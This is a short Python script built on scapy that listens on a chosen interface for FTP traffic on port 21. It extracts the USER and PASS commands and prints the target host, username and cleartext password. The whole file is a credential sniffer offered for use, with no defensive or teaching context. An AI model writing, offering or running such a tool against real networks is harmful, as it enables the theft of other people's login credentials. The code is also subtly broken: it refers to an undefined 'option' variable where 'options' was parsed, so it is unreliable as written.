#!/usr/bin/python

import optparse
from scapy.all import *
import re

def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER\s(.*)', raw)
    pswd = re.findall('(?i)PASS\s(.*)', raw)
    if user:
        print('detected FTP login to: '+str(dest))
        print('User account: '+str(user[0]).strip('\r'))
    if pswd:
        print('Password: '+str(pswd[0]).strip('\r'))
    
def main():
    parser = optparse.OptionParser('Usage: '+'-i<interface>')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()
    
    if option.interface == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = option.interface
    
    try:
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)
        
main()